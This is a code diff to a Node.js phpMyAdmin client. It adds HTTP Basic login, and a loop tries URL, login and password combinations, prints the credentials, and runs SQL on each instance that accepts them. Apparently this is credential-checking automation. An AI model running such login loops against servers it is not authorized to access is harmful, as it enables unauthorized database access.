@@ -1,6 +1,7 @@
 const fs = require('fs');
 const cheerio = require("cheerio");
 const loggedAxiosRequest = require("./services/loggedAxiosRequest");
+const axios = require("axios");
 require('dotenv').config();
 
 const phpMyAdminUrl = process.env.PHP_MY_ADMIN_URL;
@@ -60,9 +61,10 @@ class PmaClient {
      cookie;
      login;
      password;
-     session;
-     user;
-     auth;
+     encodedAuth; // для http авторизации
+     session; // для cookie авторизации
+     user; // для cookie авторизации
+     auth; // для cookie авторизации
 
     constructor(phpMyAdminUrl, login, password) {
         this.phpMyAdminUrl = phpMyAdminUrl;
@@ -70,7 +72,7 @@ class PmaClient {
         this.password = password;
     }
 
-    // === Функция для авторизации ===
+    // === Функция для авторизации при ['auth_type'] = 'cookie' ===
     loginAndGetCookies = async () => {
         try {
             // Запрос к странице входа
@@ -126,6 +128,45 @@ class PmaClient {
             //throw error;
         }
     };
+    // === Функция для авторизации при ['auth_type'] = 'http' ===
+    loginAndGetCookiesHttp = async () => {
+        try {
+            // Запрос к странице входа для получения куки
+            const response = await axios.get(this.phpMyAdminUrl, {
+                headers: { "User-Agent": "Mozilla/5.0" },
+                validateStatus: (status) => true, // обрабатываем дальше при 401 без выброса ошибки
+            });
+
+            // Получаем куки из ответа
+            const rawCookies = response.headers["set-cookie"];
+            if (rawCookies) {
+                this.cookie = rawCookies.filter(cookie => cookie.startsWith("phpMyAdmin=")).pop().split(';')[0];
+            }
+
+            // Отправляем GET-запрос на авторизацию
+            this.encodedAuth = 'Basic ' + Buffer.from(`${this.login}:${this.password}`).toString('base64');
+            const loginResponse = await loggedAxiosRequest.get(this.phpMyAdminUrl, {
+                headers: {
+                    "User-Agent": "Mozilla/5.0",
+                    Cookie: this.cookie,
+                    Authorization: this.encodedAuth
+                }
+            });
+
+            // Извлекаем токен из HTML ответа
+            const $ = cheerio.load(loginResponse.data);
+            const token = $('input[name="token"]').val();
+            if (!token) throw new Error("Не удалось извлечь токен.");
+            console.log(`Токен получен: ${token}`);
+
+            console.log(`✅ Авторизация успешна (${this.login}:${this.password}).`);
+            return token;
+        } catch (error) {
+            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message}`);
+            return null;
+            //throw error;
+        }
+    };
 
     // === Функция для выполнения SQL-запросов ===
     executeSQLQuery = async (phpMyAdminUrl, token, query) => {
@@ -144,6 +185,7 @@ class PmaClient {
                     "Content-Type": "application/x-www-form-urlencoded",
                     "User-Agent": "Mozilla/5.0",
                     Cookie: this.cookie,
+                    Authorization: this.encodedAuth
                 },
             });
 
@@ -164,7 +206,7 @@ class PmaClient {
     for (const { url, login, password } of combinations) {
         console.log(`Проверяем: ${url} с логином ${login}...`);
         const client = new PmaClient(url, login, password);
-        const token = await client.loginAndGetCookies();
+        const token = await client.loginAndGetCookiesHttp();
 
         if (token) {
             console.log(`Запускаем SQL-запрос...`);
